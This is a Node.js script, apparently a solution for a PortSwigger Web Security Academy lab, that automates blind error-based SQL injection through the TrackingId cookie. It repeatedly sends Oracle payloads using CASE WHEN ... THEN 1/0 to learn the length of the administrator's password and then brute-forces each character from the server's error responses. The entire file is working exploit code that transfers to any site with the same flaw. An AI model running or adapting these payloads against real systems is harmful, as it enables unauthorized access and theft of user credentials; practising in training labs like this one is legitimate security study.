const utils = require('../utils');

const host = 'ac171fa11ef9fe5e8026027c00a3005a.web-security-academy.net'
const responseMatchingTemplate = /Internal Server Error/gm

const maxPasswordLength = 100

const headers = utils.stringToHeaders(`Host: ${host}`)

console.log('Starting blinded password search on host=%ss', host)

async function main() {
  console.log('Determining pasword length...')

  let [body, options] = await utils.async_https_get('https://' + host + '/', headers);
  const trackingId = utils.getHeaderValue(options, 'set-cookie', 'trackingId')
  const sessionId = utils.getHeaderValue(options, 'set-cookie', 'session')

  let exit = 0;
  let i = 0;
  for (i = 0; i < maxPasswordLength && !exit; i++) {
    const headerLenCookie = `TrackingId=${trackingId}' AND (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username = 'administrator')) = ${i + 1}) THEN 1/0 ELSE 1 END FROM dual)=1-- ; session=${sessionId}`
    headers['Cookie'] = headerLenCookie;
    exit = responseMatchingTemplate.test(await utils.async_https_get('https://' + host + '/', headers))
  }

  const passwordLen = i
  console.log(`Password length detected: ${passwordLen}`)

  console.log('Determining pasword symbols...')
  let password = '' 
  for (i = 0; i < passwordLen; i++) {
    for (let ascii = 32; ascii < 128; ascii++) {
      if (ascii == 39 || ascii == 59) continue;
      const headerLenCookie = `TrackingId=${trackingId}' AND (SELECT CASE WHEN ((SELECT SUBSTR((SELECT password FROM users WHERE username = 'administrator'), ${i + 1}, 1) FROM DUAL) = '${String.fromCharCode(ascii)}') THEN 1/0 ELSE 1 END FROM DUAL)=1-- ; session=${sessionId}`
      headers['Cookie'] = headerLenCookie;
      if (responseMatchingTemplate.test(await utils.async_https_get('https://' + host + '/', headers))) {
        password += String.fromCharCode(ascii)
        console.log('Password: %s', password)
        break
      }
    }
  }
}

main()